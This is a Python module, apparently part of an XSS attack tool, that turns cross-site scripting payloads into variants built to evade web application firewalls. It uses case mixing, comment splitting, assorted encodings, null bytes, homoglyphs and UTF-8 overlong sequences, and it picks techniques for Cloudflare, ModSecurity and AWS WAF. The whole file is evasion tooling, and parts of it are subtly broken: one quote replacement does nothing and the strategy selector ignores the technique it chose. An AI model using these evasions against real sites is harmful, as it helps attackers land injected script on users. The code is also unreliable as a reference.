import random
import re
import urllib.parse
from typing import List, Dict, Callable

from . import config


class WAFBypass:
    def __init__(self):
        self.bypass_techniques = [
            self._case_variation,
            self._comment_injection,
            self._hex_escape,
            self._unicode_escape,
            self._html_entity,
            self._double_url_encode,
            self._tab_newline_injection,
            self._null_byte,
            self._unicode_case,
            self._mixed_encoding,
            self._utf8_overlong,
            self._unmatched_quotes,
            self._nested_encoding,
        ]

    def apply_all(self, payload: str) -> List[str]:
        variants = []
        for technique in self.bypass_techniques:
            try:
                result = technique(payload)
                if result and result != payload:
                    variants.append(result)
            except Exception:
                pass
        return variants

    def _case_variation(self, p: str) -> str:
        mapping = [
            ("script", "ScRiPt"), ("img", "ImG"), ("svg", "SvG"),
            ("onerror", "OnErRoR"), ("onload", "OnLoAd"), ("onfocus", "OnFoCuS"),
            ("onmouseover", "OnMoUsEoVeR"), ("alert", "AlErT"),
            ("prompt", "PrOmPt"), ("confirm", "CoNfIrM"),
            ("javascript", "JaVaScRiPt"), ("iframe", "IfRaMe"),
        ]
        for k, v in mapping:
            p = re.sub(re.escape(k), v, p, flags=re.IGNORECASE)
        return p

    def _comment_injection(self, p: str) -> str:
        if "<script>" in p:
            return p.replace("<script>", "<scr<!-- -->ipt>")
        if "</script>" in p:
            return p.replace("</script>", "</scr<!-- -->ipt>")
        if "onerror" in p:
            s = p.replace("onerror", "on/**/error")
            if s != p:
                return s
        if "onload" in p:
            s = p.replace("onload", "on/**/load")
            if s != p:
                return s
        return p

    def _hex_escape(self, p: str) -> str:
        if "alert" in p:
            return p.replace("alert", "\\x61\\x6c\\x65\\x72\\x74")
        if "confirm" in p:
            return p.replace("confirm", "\\x63\\x6f\\x6e\\x66\\x69\\x72\\x6d")
        if "prompt" in p:
            return p.replace("prompt", "\\x70\\x72\\x6f\\x6d\\x70\\x74")
        return p

    def _unicode_escape(self, p: str) -> str:
        if "alert" in p and "eval" not in p:
            return p.replace("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074")
        return p

    def _html_entity(self, p: str) -> str:
        if "<" in p or ">" in p:
            return p.replace("<", "&#60;").replace(">", "&#62;")
        return p

    def _double_url_encode(self, p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=''), safe='')

    def _tab_newline_injection(self, p: str) -> str:
        result = p
        # Tab before = signs
        result = re.sub(r'(\bon\w+)=', r'\1\t=', result)
        # Newline in attributes
        result = re.sub(r'(\bon\w+)=', r'\1\n=', result)
        if result != p:
            return result
        return p

    def _null_byte(self, p: str) -> str:
        if "onerror" in p:
            return p.replace("onerror=", "onerror%00=")
        if "onload" in p:
            return p.replace("onload=", "onload%00=")
        if "onfocus" in p:
            return p.replace("onfocus=", "onfocus%00=")
        return p

    def _unicode_case(self, p: str) -> str:
        mapping = {
            's': '\u017f', 'S': '\u017f',
            'c': '\u0107', 'C': '\u0106',
            'r': '\u0155', 'R': '\u0154',
            'i': '\u0131', 'I': '\u0130',
            'p': '\u1e55', 'P': '\u1e54',
            't': '\u0163', 'T': '\u0162',
        }
        result = list(p)
        for i, ch in enumerate(result):
            if ch in mapping and random.random() < 0.3:
                result[i] = mapping[ch]
        return ''.join(result)

    def _mixed_encoding(self, p: str) -> str:
        if "alert(" in p:
            return p.replace("alert(", "&#97;&#108;&#101;&#114;&#116;(")
        if "confirm(" in p:
            return p.replace("confirm(", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(")
        return p

    def _utf8_overlong(self, p: str) -> str:
        overlong = {
            '<': '%C0%BC',
            '>': '%C0%BE',
            '"': '%C0%A2',
            "'": '%C0%A7',
        }
        result = p
        for orig, rep in overlong.items():
            if orig in result:
                result = result.replace(orig, rep, 1)
                if result != p:
                    return result
        return p

    def _unmatched_quotes(self, p: str) -> str:
        if '"' in p:
            return p.replace('"', '"')
        return p

    def _nested_encoding(self, p: str) -> str:
        return urllib.parse.quote(p.replace("<", "%3C").replace(">", "%3E"))

    def detect_bypass_techniques(self, payload: str, response_text: str) -> List[str]:
        bypasses = []
        if any(c.isupper() for c in payload) and re.search(re.escape(payload), response_text, re.IGNORECASE):
            bypasses.append("case_variation")
        if "%2F" in payload or "&#" in payload or "\\u" in payload or "\\x" in payload:
            bypasses.append("encoding")
        if "%00" in payload:
            bypasses.append("null_byte")
        if any(ws in payload for ws in ["\n", "\r", "\t", "&#9;", "&#10;", "&#13;"]):
            bypasses.append("whitespace")
        if "<!--" in payload or "-->" in payload or "/**/" in payload:
            bypasses.append("comment_injection")
        if "%C0" in payload or "%C1" in payload:
            bypasses.append("utf8_overlong")
        if "%253C" in payload or "%253E" in payload:
            bypasses.append("double_url_encode")
        return bypasses


def select_bypass_strategy(waf_names: List[str]) -> List[Callable]:
    strategies = []
    if any("Cloudflare" in w for w in waf_names):
        strategies.extend([WAFBypass._comment_injection, WAFBypass._unicode_escape, WAFBypass._tab_newline_injection])
    if any("ModSecurity" in w for w in waf_names):
        strategies.extend([WAFBypass._null_byte, WAFBypass._case_variation, WAFBypass._hex_escape])
    if any("AWS" in w for w in waf_names):
        strategies.extend([WAFBypass._double_url_encode, WAFBypass._mixed_encoding, WAFBypass._nested_encoding])
    if not strategies:
        strategies = [
            WAFBypass._case_variation, WAFBypass._comment_injection,
            WAFBypass._hex_escape, WAFBypass._unicode_escape,
            WAFBypass._html_entity, WAFBypass._tab_newline_injection,
        ]
    bw = WAFBypass()
    return [lambda p, s=bw, m=t: s.apply_all(p) for t in strategies]
